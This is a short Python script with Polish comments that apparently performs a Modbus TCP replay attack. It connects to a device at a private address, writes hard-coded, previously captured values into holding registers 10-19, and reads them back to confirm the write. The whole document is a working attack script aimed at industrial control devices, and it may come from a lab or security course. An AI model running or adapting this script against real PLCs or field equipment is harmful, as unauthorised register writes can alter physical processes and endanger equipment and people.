import time
from pymodbus.client import ModbusTcpClient
SLAVE_IP = "192.168.0.10"
SLAVE_PORT = 502
#paramatry transakcji modbus
DEVICE_ID = 255 
START_ADDR = 10
COUNT = 10
wartosci = [225, 0, 0, 0, 0, 0, 0, 0, 0, 0]
#opoznienie wywolania skryptu
DELAY_S = 3
def main():
    print(f"[i] Czekam {DELAY_S}s przed REPLAY...")
    time.sleep(DELAY_S)
    #utworzenie klienta Modbus TCP
    client = ModbusTcpClient(SLAVE_IP, port=SLAVE_PORT, timeout=3)
    if not client.connect():
        print("[-] Brak połączenia TCP")
        return
    #odtworzenie wczesniej przechwyconej wartosci i zestawienie jako nowe polaczenie
    res = client.write_registers(address=START_ADDR, values=wartosci, device_id=DEVICE_ID)
    print("[WRITE RESPONSE]", res)
    #odczyt czy slave przyjal wartosci poprawnie
    verify = client.read_holding_registers(address=START_ADDR, count=COUNT, device_id=DEVICE_ID)
    print("[READ VERIFY]", verify)
    #zamkniecie sesji TCP
    client.close()
if __name__ == "__main__":
    main()
